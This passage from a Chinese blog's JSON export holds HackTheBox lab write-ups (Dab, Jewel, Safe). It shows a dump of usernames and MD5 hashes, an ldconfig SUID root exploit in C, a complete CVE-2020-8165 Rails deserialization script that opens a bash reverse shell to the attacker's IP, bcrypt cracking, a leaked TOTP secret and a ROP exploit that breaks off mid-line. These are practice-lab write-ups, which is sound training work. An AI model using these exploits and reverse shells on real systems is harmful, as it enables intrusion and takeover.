\"c1d5ae95f059832af7450a139b33e9de\", \"trace\": \"432ed5f38900291bedf745852d9262ee\", \"price\": \"abea2606dc153afbcb47183068c7ec15\", \"jaylan_sanford\": \"96bd0e2a65e755af22c5a803bb1d2c79\", \"rylee.schuppe\": \"3cd59cd615fc807d7ef87ec2a5267a38\", \"phyllis\": \"bd20c64d01d096f8549232d44439abb4\", \"pinkie_abshire\": \"dba20ec8e1763ff9d4dddffb1a3ff961\", \"wilfredo\": \"037b4fa2b48db8267f73c6e0e1231576\", \"roberta_collins\": \"7cb47ceed22341c820f1526495b2ddef\", \"hanna\": \"879408400ee777697ffb19c6418c2068\", \"wyatt.pfeffer\": \"f25e618fabe1a76258019d690e9f9377\", \"erich_mertz\": \"b5e72bddda06d750f37fbb6f8606fe0d\", \"jarrell_gorczany\": \"f6c21d7f525ded5de3670e70db8f7124\", \"kelsie\": \"8d297f740b0fa8427a30b4657743387d\", \"lyla\": \"21b720ab14b8c538a35efa07af4d4366\", \"ed.wintheiser\": \"59dc08f2af53ce7427d9d9a5a2270e92\", \"rashad\": \"9dc57e5f42a313510cb1aa808ffda1c2\", \"thomas\": \"139563da1ef16ad511ac15199f1e432c\", \"einar\": \"b7bc4ae911a48e8e8a01704b02ca143d\", \"margarita_cummings\": \"6c87acbf9020381c93d6a896ea24bee2\", \"kayley\": \"d2efe33258db4b2384cf35227b096856\", \"finn\": \"a52b5c9241362d50663494282bffbc85\", \"maribel_gutkowski\": \"604f950b023d40e015a3808f9f77fa67\", \"raymond.dooley\": \"debf9e221aec842c96573f2b38525af4\", \"eve_koss\": \"69744c04604496df7e28a751e74f7850\", \"kayla_huel\": \"a9c1f7e2bbb6d19ca08acc56fc098f1e\", \"roma.reynolds\": \"ba0957e50bc7d04ea154da4a0da8931d\", \"sierra\": \"5d70d8e5414987d75d12fc909e9704bf\", \"adolphus\": \"c04edf1891481c950b432129c98ae579\", \"alda\": \"882c80e0fd479bd4ff538f156fba3007\", \"celestino_smith\": \"8d4c417b64ad4ad68765620f701247f6\", \"loyce\": \"c877cc765ceca0d59fb904be5a44d749\", \"hoyt\": \"1702b74835052498b402420b3c42ea30\", \"hilda_o'connell\": \"d1ad483a1ecc574c50de8290c769b497\", \"twila\": \"e5d7761a26646db3b9dcf523d53fbc45\", \"marcus_abbott\": \"bf9e1d4004b24775d2886a03174871fa\", \"everette.brakus\": \"a4150e0f035ef0bfc6ec3e2aa5c54dd7\", \"jazmyne.nader\": \"340cee69be65e03800dbce4be148b7a3\", \"foster.davis\": \"4953daecc037486e2d0aafc0cbfc5edd\", \"dante\": \"d67ddde9004daea336376d51b2bdeb41\", \"aron\": \"102647061f946392944b8ad4a9da8e2f\", \"lora_skiles\": \"0b42ca911325410e734c6269ca800014\", \"doris_ritchie\": \"f520ca8d3c45df2ce8083daedc8d6164\", \"jalyn\": \"888b79bce75a12dd9f59b19abd975f8e\", \"issac_glover\": \"4cae6414e2e8e0dcff0e3757f74a3e7d\", \"esmeralda\": \"fb0b7274ee215172d13f0c7d5ea43407\", \"mandy_emmerich\": \"2f7af55c3d7d8fbb2248b0a84ba1d153\", \"liam.boehm\": \"66eb73de6fee1d06c74dff71db2fb423\", \"guillermo.fisher\": \"fbb789c02ded40c7f379df2f7864cced\", \"payton_feil\": \"c4629a6f0e9e2bd433e7b75de370a7d1\", \"jabari\": \"26cd05032b69d980d469049a45d4ff5f\", \"allie\": \"582f3f26054b3d582c5aac48e82fd732\", \"gregoria.bayer\": \"987e9d24bc4c2c7c9df882eaffc46dd1\", \"tabitha_paucek\": \"6ab9a62446efea28f67cad6743e2b858\", \"alexandria.roob\": \"2c5167c7a9ea4adef95ebcb1a78941aa\", \"ralph\": \"936f45609ddf114ee072b6913fdfcf5c\", \"winnifred.ruecker\": \"0af32299c1f10ebefa8d1c0e8c456bec\", \"deven.sanford\": \"ba0d68ca29c0909f1e8059641c0a239b\", \"rosie\": \"4e1fc346e7c4ab1a4117e672104c2868\", \"coralie_zieme\": \"54367234b56d1e840e7be52d08244697\", \"elbert_dooley\": \"d78c8062386ffd8cfc69c122eb61ca5f\", \"admin\": \"2ac9cb7dc02b3c0083eb70898e549b63\", \"keaton\": \"08cbb71c4a2724b9c8d0c5648b80acd6\", \"cleora.breitenberg\": \"181defb29bbf88668e8c92c4944342e2\", \"kirk.flatley\": \"2d93560dd57e4a7407639ce806b6f3e2\", \"immanuel_zieme\": \"89e90a214d3cdd0c7ce8cac78ae892ae\", \"dortha_schroeder\": \"eb6a24bc790c13f5f2d337d3341b6a53\", \"jackeline\": \"3f5f1d06ebf561d9c81395899515cd85\", \"magnus_stark\": \"d1cdc22920628286a631548ab045fbf4\", \"jerrell_huels\": \"ca9c98e7344ae860610fcf93a4aae1b6\", \"gwen\": \"b1d06d3ff76a39149901caecb75241b2\", \"lew\": \"2d62043137f31a3fd83d39f6ba64d0b0\", \"anahi\": \"e48819f584319fc7825818cb052bf6ca\", \"gerry.wehner\": \"f3d8cc2c0b7ff6273b0731f147236de0\", \"denis\": \"32a03378dbb3709c00fe1d91e2962918\", \"alvera.emmerich\": \"22e5af624d97a9958442d0ac75db1075\", \"tiana\": \"220607eb9bbf6b2a4f950fbb1e4ae059\", \"sammy\": \"a8a37c7f172c27043ca799694aeea5b0\", \"keyon\": \"a3154a1560f1e81af73b30944f4c5e32\", \"nicole\": \"23f848ba3deff4b595e1e4bc25dbaeb5\", \"ronny_koch\": \"c3aba5517f098239b4b9b201bd4aaa7f\", \"tatyana_dietrich\": \"e14fdc75604d2c3a779513ed2aa4ada9\", \"jeramy.jacobs\": \"ddd250fe435a67417e08681becea604a\", \"marcel_ratke\": \"41f789d9e284ddcf98a8ae41fc46574a\", \"porter.murazik\": \"c5aa1c9ed87d1640fad00c81d6b606b9\", \"dallin.marvin\": \"1d29e1907add5bdc157be32b85844b2a\", \"neoma.nader\": \"5727cac3cbb8f794a397b08887d7928b\", \"jerrell.dickinson\": \"b2ab997c50b8b46dfadc584eea737456\", \"destiney_o'reilly\": \"7686e6e57f4aab28b9c359ad0d86ec97\", \"amani\": \"1d1f548717379da48997e969a8a64d3a\", \"arjun.ernser\": \"504859dab10aefaafa0d0c7671e1b16c\", \"dannie.stroman\": \"14cee124780356003325d96308efbf44\", \"caterina\": \"41a0e81194b21f3f37223004c13849d9\", \"stuart_gutkowski\": \"af0cc9fdcc686b01d089549aa0605213\", \"maude_zemlak\": \"d7f1e37a869b117301dbeb9f086a3fef\", \"mireille_cruickshank\": \"f3923875bfc6f4aa9a0ff9a521ec936d\", \"isabelle\": \"c20670ad7cf7664ccede04858d108cdd\", \"sandrine_crist\": \"2fb83faa50fde4f34460e7a30696fd59\", \"alva\": \"c0431f9f4faf269c193120cdbd00a21a\", \"doris_donnelly\": \"03104c8c48333b42c8f83fcda8880e6f\", \"kaitlin\": \"eb85fe5e49ede1ef9569f163ff3f4470\", \"jean.lemke\": \"516916298f414abef25f683fa941110e\", \"abdiel\": \"2c910ddfc4e0132d1d81a1d620600467\", \"abner_stroman\": \"5935d0e1a496b73537777fcf406dc020\", \"macey\": \"bafed1c91004a16534b19d681f03d530\", \"devonte\": \"c1cd9d0cd159ecf73c3a0c404c144211\", \"iva\": \"0173414ea8139684f04d954ef3c8c1a9\", \"paolo_streich\": \"c5584a3f8a4127f8267cecbe5a472035\", \"demo\": \"fe01ce2a7fbac8fafaed7c982a04e229\", \"owen\": \"8df8c31baf45ef725c33801ada12b5ea\", \"audrey\": \"9a1ab2202abb2b8e9dc7e2783f75788d\", \"darrell\": \"ddeac952a6740e05f416de5874c1cd56\", \"mathilde.yundt\": \"c0aed5cc753584cb09a42f22bc4901af\", \"jeanie_balistreri\": \"3b5055ec0293d04caebd679b7979da29\", \"dejah_wilderman\": \"d2642f95ebe20b65169e0f927b2b0999\", \"bella\": \"4bafc76b4a11f6a1ce1ef988d995262a\", \"vladimir.rogahn\": \"b9c8ed82f30172bc20c97e2fd8e0cc8f\", \"samson\": \"029b7aa1acd10b796b196ee3d4097e0d\", \"tristian\": \"d24be8b2125f6d22d4c5ce43e1e3199d\", \"xavier_jacobson\": \"2b82a4c1aa7f9c44ed6e3bd1914ac490\", \"evie\": \"de12f8592ef5395a15b6fd2202197536\", \"dock.kiehn\": \"5a7e5ec678249f652a3bb81cad0c9f60\", \"vivien\": \"3454f4d3387a9bd8a08d862b457e486b\", \"gaston.mills\": \"a6cf224244f758d16713db0b3f0f21fc\", \"mafalda\": \"0a8403926f54f19f0e46f17b91a2c2ae\", \"arturo\": \"cae80c57461a1a295f04b4a49ee1293a\", \"tiara_schneider\": \"10a84f8c91255b419fa881d6f732faf5\", \"conor\": \"e010250e00ec9d5af6f77e40cda87897\", \"kristy\": \"575fa3862f7222b9b5385026ef32d688\", \"alfredo\": \"cd39f9ce29eb4c5bf7ed71a834e4d894\", \"rocio\": \"c54b17127ad539da05763e88d344cfbf\", \"kavon_jaskolski\": \"e5940103ff76021050b570d798e5239c\", \"sonya_abbott\": \"b7d25922e320182c85ea45686f56a775\", \"summer\": \"ba75add97ea218ceb7dda8e28bb24eab\", \"savannah\": \"e09006276783fa0feee15a4f51287855\", \"jaquan.sauer\": \"6f04804d79697dbae3657b5934f26074\", \"jayce.hintz\": \"99b487460c327c8d5c7ca663219e8b74\", \"margarita_okuneva\": \"00d06142ce0b5a7243ad2909b5848c59\", \"cary.ondricka\": \"bfbf852d0872233ba848917ae607575f\", \"lexus\": \"083e0bd1e7149ee3f759fbf6ae3485f1\", \"logan.white\": \"a58a994f2ba6a7ffb61f5cb0b89d8523\", \"nick\": \"1a05c0b6f48562aec32810bc35073661\", \"rose\": \"61651b6760fb585a3641bc41da8e855c\", \"pat_wilkinson\": \"e57588e053a34e57c691033732082f58\", \"genevieve\": \"fc7992e8952a8ff5000cb7856d8586d2\", \"blaise.sauer\": \"86cab94e4c136f058cc9710e5463268b\", \"abbigail\": \"9731e89f01c1fb943cf0baa6772d2875\", \"sonia\": \"16e536ac3d8b71a8458bca4b4a5c02ea\", \"maya\": \"bcd23bf4b88d707dc8b9779d7be17189\", \"monique\": \"8b005ce5899bb266c949c49dd4662ec6\", \"eugene_kreiger\": \"3955cb5285fef4dd8f248ca3b97e933b\", \"ahmed_gibson\": \"8915af36bc729f449664fd5a0c720c75\", \"clair.cronin\": \"93ccb8768bf9aacdec74de999e01a5bf\", \"sarina.hodkiewicz\": \"ee1439dfb65cc43814d8dc59fa90a339\", \"lavonne.schroeder\": \"fe1a46f519e9af9fa10b9d12f88b96d7\", \"dewayne.steuber\": \"ffc56ad16ada1bba47a8104956d67d71\", \"fernando\": \"1f1bcc2c1b44b07e2364f3741a47762e\", \"marques\": \"8e6f8704b029cae0e26636be1bce50ef\", \"brianne_heathcote\": \"4b6f19924e076f588844e91aa4caa089\", \"rachael\": \"32fc152051586ba48c5eb53d1f9bc11a\", \"alexandra\": \"ce7f915c0b543ed8d4b77a47dd24737c\", \"clementina\": \"0f5198cbc4b9a98548dbf946eb8c2168\", \"kathryne_kling\": \"9009e43a2805a6f1d45d3d9c59b3c130\", \"alexandre\": \"2d4b230e2240053c4d9ebb9613856908\", \"ivah\": \"2b0535023a614acafb7b7f5fbb91eb3b\", \"xander_schoen\": \"efbbd15b30cbfe2a206ca1291deca009\", \"shea\": \"d2736f6b7b47a40b1615af3ae419f6ab\", \"donny\": \"94e406b569e15565746d0a9592636f56\", \"jimmie\": \"4950c4c8e41c25a0c4cc913ff3f96ef1\", \"kathlyn\": \"34b8bce72871d15ced725cc1184f8f4a\", \"cleve_mckenzie\": \"4ae1a59c3cbaa065adbf26b904fa6781\", \"ashtyn.will\": \"d249b651702c68a2ed1fcfe2b4d99987\", \"presley.weissnat\": \"7b5168687749996ab74316a885e2b881\", \"marjolaine\": \"947c16a51f8e590debf7c9105d64c7df\", \"vivian\": \"ef0ca75e2d27434d2c4e02ac2c0f0c6e\", \"jennings\": \"41121d6da3615554ad0e0d01172634ba\", \"merritt_marks\": \"08ab1f602ea471e4e1a04f3934ec73e9\", \"efrain.hoppe\": \"31446ccc8161d50e2cecc133e0b11f85\", \"carol\": \"1f7374359d1456c11497aeaea408f84a\", \"genoveva_carter\": \"8838d8fd3db319f7a6a67d0ab5e52021\", \"jevon\": \"9e876fe23bd371b5bf7c07ca3f6d7634\", \"julia_monahan\": \"4c7fc2df5576ee3b68c5c79a755a0d33\", \"stanton_reynolds\": \"eed7a216ee2b9026591a29354acd3193\", \"tyrel\": \"150937304c73b4088c35c574d2f41f03\", \"carolyn\": \"4e2de8249eaeb94175a3e4824ff66c7c\", \"willow_mayer\": \"c65ea95f54056088f616601766eaa2db\", \"elenora_hahn\": \"919cff95c01cf51e2fd9a74db418c4bf\", \"jacinto.yundt\": \"ff5c237762ac41b30e59bc7b21042ba7\", \"aliyah\": \"20b4192f696213a8f4c7e5c7f84d60d1\", \"wade\": \"90346439328d6a4dd28af2b68acd5048\", \"leonel.marquardt\": \"ed98c3ce8aea0881334fe76de885dfc4\", \"marie\": \"7905c8fa4ede73a339906006b0e9c7c9\", \"jany\": \"a0a84994d69b3e738c1ac376df1dcabf\", \"vicky.hansen\": \"3e92536b0a568ede949bf1589bd16318\", \"arielle.sauer\": \"4bbe939fc8ac2d9bffc36aed5dacb9b1\", \"angelina.murazik\": \"aea180b10da81b62ffb6f35c033d99b1\", \"marcelo_brown\": \"f016e357657692aa181ca3cdfaf7b811\", \"eulah\": \"d772f9b38c9aa2d457c034d838c1be21\", \"jerrell\": \"1fe4031155a1412eb41f806740209cb0\", \"robyn_koepp\": \"edb235d64e26dfe7eecf820aeec20d09\", \"johnathon\": \"1cc714db88bbf5cd11ce6de641bf9e8d\", \"jacquelyn\": \"8189067a15ac1a5f5d57b6520b3c5c98\", \"nickolas.muller\": \"6bdde7ca2ab71fbb063c4d94ba7a0cb0\", \"lilliana_cummings\": \"c9c4cc2813f63b6da914965e41ba3476\", \"rachelle\": \"8d783621dfdb8722a80b5b10a45632ee\", \"lauretta\": \"eb462e1df69951cfb55d2cee556a49cb\", \"cordie.ortiz\": \"e12fa6b635222f258e1b0729755f3746\", \"rick\": \"0daa6275280be3cf03f9f9c62f9d26d1\", \"karl_hane\": \"1707c74ab5a1f96b9561a5b905b4f0f0\", \"gail\": \"5ae72fc8f3cb837ea4199362d70d7ae7\", \"adelia.berge\": \"bab4822dc29350a71e1015c916782713\", \"bud\": \"a994cdb47a8f661d7c091f84d4bd17ce\", \"rahul\": \"4b6d890ff0ba849d2724ace69db763c3\", \"stanford\": \"29de69a508e1f96a87898f50a564b9a6\", \"default\": \"c21f969b5f03d33d43e04f8f136e7682\", \"emie\": \"f519fdd188bb126dc912227a8163745c\", \"anna.bins\": \"10a6fffd7be7a218b2bd3507dc175dc5\", \"dane_wyman\": \"0ba31824ccdb1e133f79ad04f3855e40\", \"arne\": \"a791bbdf84fd98116c04246573d98e4a\", \"nat.wilkinson\": \"dcefd200f4856aeda1fc721a544fa717\", \"gerda\": \"377fc2d8b7c81f91708352491bc5d1e9\", \"roselyn_streich\": \"e32eebf5d2da2d61f08e5e4dfff04029\", \"d_murphy\": \"254e5f2c3beb1a3d03f17253c15c07f3\", \"jacynthe.kiehn\": \"bc8bb4c0f4ce272086b2cf02f6123f1d\", \"kianna_block\": \"bceee353497d21dad6b745d668d1ba3c\", \"manley\": \"be362c649da16df9d5a9fa854ddd3a24\", \"chaz\": \"648a629ea7ac036a9837e72da9f1fac5\", \"joanie_zboncak\": \"0297dc52c8540050dad5fc82aaa3026b\", \"adolph.kohler\": \"65b6d8708f1e865ca9378fec74407ce6\", \"dejon\": \"389bfdf3859555f26c28827583237c57\", \"dorcas\": \"2a9bed3bb2052c644a7f3130ddc78546\", \"benjamin.pfannerstill\": \"67b3ded77ab0a3f4eefd37a2ded00f48\", \"onie_kreiger\": \"0406b1f270012cdafac8fab92fb0ccd5\", \"jaquelin.medhurst\": \"63d75125cf5db3fe850cf359e0237992\", \"heidi_krajcik\": \"adf27575ef70c773fed3cd82fa06fa1f\", \"clement_cummerata\": \"4d71cd239acb3f9a5198159beaa05575\", \"tess\": \"389e03628382fb010c729319953e4c78\", \"lance\": \"b713cf03505e7e3b995f45f6df5e9460\", \"ursula.weimann\": \"e12e607e7bdd2105cc3d68c33c0d905e\", \"maximus_robel\": \"c3655a791fa65e0a75c849c1d56d66a1\", \"irma\": \"5177790ad6df0ea98db41b37b602367c\", \"lucie\": \"01971ddb0d362010a8e484f0630de1e9\", \"devon\": \"953155467fab407a18cb7c8f576d1ef6\", \"kory\": \"c40c83a8bd2914202bd22770405b0b4c\", \"keely.reynolds\": \"8b0b59e115aad4d3deee62b591c80b28\", \"adrianna\": \"3ceb64d1364a8c92134484029e4f2770\", \"jaylin.langworth\": \"f3e06518bbfa9d108ad30cf5628e480a\", \"agustin.kreiger\": \"a434c202f65475988efa9622a77f9594\", \"shaylee_roob\": \"81dbedf631f0dd59d00403c661972c0a\", \"zelma\": \"55f0db8276de5dc76d9b858bd0de78a0\"&#125; user flag得到的账号密码ssh登录，user.txt: 提权信息suid发现一个myexec： myexec运行需要密码，简单的ltrace就能得到密码，s3cur3l0g1n： 运行发现调用一个函数，尚未实现： ldconfigLinux 实施的一项真正智能的保护措施是，在LD_PRELOAD使用时，任何 setuid 权限都会被删除。所以这里并不能用常规的LD_PRELOAD 但前面suid可以看到ldconfig，可以通过这个来修改库加载路径： https://gtfobins.github.io/gtfobins/ldconfig 12gcc -shared -fPIC /tmp/a.c -o /tmp/libseclogin.soldconfig -f miao.conf exploit &amp; root flag修改代码执行exp即可： exp.c12345#include &lt;stdlib.h&gt;void seclogin()&#123; setreuid(0,0); execve(\"/bin/bash\",NULL,NULL);&#125; 参考资料 https://gtfobins.github.io/gtfobins/ldconfig HTB: Dab | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/02/02/htb-dab.html https://www.hackthebox.eu/home/machines/writeup/150 HackTheBox - Dab - YouTubehttps://www.youtube.com/watch?v=JvqBaZ0WnV4&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Jewel - HackTheBox","slug":"Jewel-HackTheBox","date":"2020-10-27T01:56:37.000Z","updated":"2021-02-18T00:44:31.856Z","comments":true,"path":"2020/10/27/Jewel-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/10/27/Jewel-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/282 10.10.10.211 端口扫描常规的22,8000,8080： 1234567891011121314151617181920212223242526$ nmap -Pn -sC -sV 10.10.10.211Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-27 08:50 CSTNmap scan report for 10.10.10.211Host is up (0.069s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)| 256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)|_ 256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)8000/tcp open http Apache httpd 2.4.38|_http-generator: gitweb/2.20.1 git/2.20.1| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.38 (Debian)| http-title: 10.10.10.211 Git|_Requested resource was http://10.10.10.211:8000/gitweb/8080/tcp open http nginx 1.14.2 (Phusion Passenger 6.0.6)|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6|_http-title: BL0G!Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds 80008000是gitweb： 80808080是一个blog： gitweb8000的gitweb简单浏览能发现一些文件，其中有一个bd.sql是sql备份文件： 1http:&#x2F;&#x2F;10.10.10.211:8000&#x2F;gitweb&#x2F;?p&#x3D;.git;a&#x3D;blob;f&#x3D;bd.sql;h&#x3D;a7fddb693ca735f8aa1e4b09046cec2adddddc51;hb&#x3D;HEAD bd.sql在sql文件中得到用户信息： 1234COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;1 bill bill@mail.htb 2020-08-25 08:13:58.662464 2020-08-25 08:13:58.662464 $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW2 jennifer jennifer@mail.htb 2020-08-25 08:54:42.8483 2020-08-25 08:54:42.8483 $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb&#x2F;hjisgk2vws1xYC&#x2F;hxw8M1nFk0MQy\\. john对得到的Hash进行破解,hash是bcrypt加密格式,破解失败(兔子洞)： 1234567891011➜ Jewel cat hashes.txt$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy➜ Jewel sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt[sudo] password for miao:Using default input encoding: UTF-8Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 4096 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status BL0G 转到8080 blog，随意注册一个账号登录： rails1http:&#x2F;&#x2F;10.10.10.211:8000&#x2F;gitweb&#x2F;?p&#x3D;.git;a&#x3D;commitdiff;h&#x3D;5d6f436256c9575fbc7b1fb9621b18f0f8656741 根据8000端口gitweb上面的信息，这个blog应该是基于ruby rails，并且rails版本是5.2.2.1： 搜索得到CVE-2020-8165： [CVE-2020-8165] Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStorehttps://groups.google.com/g/ruby-security-ann/c/OEWeyjD7NHY masahiro331/CVE-2020-8165https://github.com/masahiro331/CVE-2020-8165 之后就是一步步打，或者直接用脚本 CVE-2020-8165.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python#import requestsimport reimport sysURL='http://&#123;&#125;:8080'.format(sys.argv[1])username='miao'password='123456'email='miao@miao.com'if len(sys.argv) != 4: print(\"specify target IP, your IP and port: python3 rev.py 10.10.xx.xx 9001\") exit(0)s = requests.Session()resp = s.get(URL + '/signup')rx = r'token\" content=\"(.*)\"'token = re.search(rx,resp.text).group(1)# create userdata = &#123;&#125;data['utf8'] = 'â'data['authenticity_token'] = tokendata['user[username]'] = usernamedata['user[email]'] = emaildata['user[password]'] = passworddata['commit'] = 'Create User'resp = s.post(URL + '/users', data=data)# logindata = &#123;&#125;data['utf8'] = 'â'data['authenticity_token'] = tokendata['session[email]'] = emaildata['session[password]'] = passworddata['commit'] = 'Log in'resp = s.post(URL + '/login', data=data)rx = r'href=\"/users/(.*)\"'user_id = re.search(rx,resp.text).group(1)# rev shellrev = \"bash -c 'bash -i &gt;&amp; /dev/tcp/&#123;&#125;/&#123;&#125; 0&gt;&amp;1'\".format(sys.argv[2], sys.argv[3])payload = '\\x04\\x08o\\x3A\\x40ActiveSupport\\x3A\\x3ADeprecation\\x3A\\x3ADeprecatedInstanceVariableProxy'payload += '\\x09\\x3A\\x0E\\x40instanceo\\x3A\\x08ERB\\x08\\x3A\\x09\\x40srcI\\x22'payload += '&#123;&#125;\\x60&#123;&#125;\\x60'.format(chr(len(rev)+7), rev)payload += '\\x06\\x3A\\x06ET\\x3A\\x0E\\x40filenameI\\x22\\x061\\x06\\x3B\\x09T\\x3A\\x0C\\x40linenoi\\x06\\x3A\\x0C\\x40method\\x3A'payload += '\\x0Bresult\\x3A\\x09\\x40varI\\x22\\x0C\\x40result\\x06\\x3B\\x09T\\x3A\\x10\\x40deprecatorIu\\x3A\\x1F'payload += 'ActiveSupport\\x3A\\x3ADeprecation\\x00\\x06\\x3B\\x09T'data = &#123;&#125;data['utf8'] = 'â'data['authenticity_token'] = tokendata['_method'] = 'patch'data['user[username]'] = payloaddata['commit'] = 'Update User's.post(URL + '/users/' + user_id, data=data)s.post(URL + '/users/' + user_id, data=data)s.get(URL + '/articles') user flag打到bill用户的shell，在用户目录得到userx.txt： 1python3 CVE-2020-8165.py 10.10.10.211 10.10.14.7 4445 提权信息/home/bill/blog/bd.sqlBlog目录也有个bd.sql: 1234COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;1 bill bill@mail.htb 2020-08-25 08:13:58.662464 2020-08-25 08:13:58.662464 $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW2 jennifer jennifer@mail.htb 2020-08-25 08:54:42.8483 2020-08-25 08:54:42.8483 $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy\\. /var/backups/dump_2020-08-27.sqlbackups目录也有个sql文件： 1234COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;2 jennifer jennifer@mail.htb 2020-08-27 05:44:28.551735 2020-08-27 05:44:28.551735 $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO1 bill bill@mail.htb 2020-08-26 10:24:03.878232 2020-08-27 09:18:11.636483 $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW\\. hash crack再次尝试破解这些hash，这次解出来一个： 12345678910111213➜ Jewel cat hashes.txt$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW➜ Jewel sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt[sudo] password for miao:Using default input encoding: UTF-8Loaded 4 password hashes with 4 different salts (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 4096 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusspongebob (?) 这个密码是bill用户的，但尝试sudo -l后还需要一个验证码： .google_authenticator在bill用户目录发现隐藏文件.google_authenticator： 123456bill@jewel:~$ cat .google_authenticatorcat .google_authenticator2UQI3R52WFCLE6JTLDCSJYMJH4\" WINDOW_SIZE 17\" TOTP_AUTHbill@jewel:~$ 得到OTP生成的secret，然后随便找个生成工具就可以生成OTP： sudo -lsudo -l显示可以可以使用gem: 利用方式： gem | GTFOBinshttps://gtfobins.github.io/gtfobins/gem/ 提权 &amp; root flag 然后就是一键root，得到root.txt： 参考资料 [CVE-2020-8165] Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStorehttps://groups.google.com/g/ruby-security-ann/c/OEWeyjD7NHY masahiro331/CVE-2020-8165https://github.com/masahiro331/CVE-2020-8165 gem | GTFOBinshttps://gtfobins.github.io/gtfobins/gem/ Jewel HackTheBox WalkThrough | Ethicalhacs.comhttps://ethicalhacs.com/jewel-hackthebox-walkthrough/ Jewel - YouTubehttps://www.youtube.com/watch?v=QLdUkyySnic&amp;ab_channel=DavidDavies","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Safe - HackTheBox","slug":"Safe-HackTheBox","date":"2020-09-26T05:21:10.000Z","updated":"2021-09-26T05:22:31.149Z","comments":true,"path":"2020/09/26/Safe-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/26/Safe-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/199 10.10.10.147 端口扫描22,80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.147Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-22 20:35 CSTNmap scan report for 10.10.10.147Host is up (0.33s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey:| 2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)| 256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)|_ 256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)80/tcp open http Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Apache2 Debian Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 111.30 seconds 80apache默认页面，提示可以下载myapp分析，运行在1337端口： myapp一个elf： 1337 rop基础rop，直接gets puts，有system,： 0xdf给出了三种不同的方式 常规的leak addr，确认libc base，计算出其他所需地址，rop .data部分可读写，发送/bin/sh\\x00后调用system的rop 利用自带的test函数，system放到r13后/bin/sh放到栈顶，然后调用test函数相当于syetem(/bin/sh): exp.py123456789101112131415161718192021222324252627282930#!/usr/bin/env pythonfrom pwn import *context(os=\"linux\", arch=\"amd64\")#context(log_level='DEBUG')junk = \"A\"*120got_puts = p64(0x404018)plt_system = p64(0x401040)pop_rdi = p64(0x40120b)main = p64(0x40115f)payload = junk + pop_rdi + got_puts + plt_system + mainp = remote(\"10.10.10.147\", 